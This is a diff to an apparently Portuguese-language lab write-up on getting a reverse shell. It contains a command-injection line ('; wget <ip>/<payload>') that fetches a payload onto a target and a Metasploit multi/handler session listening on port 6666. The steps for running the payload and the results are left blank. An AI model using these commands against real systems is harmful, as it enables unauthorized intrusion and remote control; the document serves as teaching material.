@@ -87,8 +87,27 @@ index.html  index.lighttpd.html  index.nginx-debian.html  meu_payload.py
 ```
 ### Passo 3 - copiar o payload para a máquina alvo
 `; wget <ip>/<payload>`
-
+### Passo 4 - encerrar o serviço web
+`$ sudo service apache2 stop `
 ## Execução do ataque
 
 ### Passo 1 - iniciar a escuta
+Iniciamos a escuta informando o IP e a porta de escuta (a  mesma do payload)
+```
+msf > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+
+msf exploit(multi/handler) > set LHOST 192.168.1.10
+LHOST => 192.168.1.10
+
+msf exploit(multi/handler) > set LPORT 6666 
+LPORT => 6666
+msf exploit(multi/handler) > run
+[*] Started reverse TCP handler on 192.168.1.10:6666
+```
+### Passo 2 - Executar o payload no alvo
+
+
+
+### Resultado
 
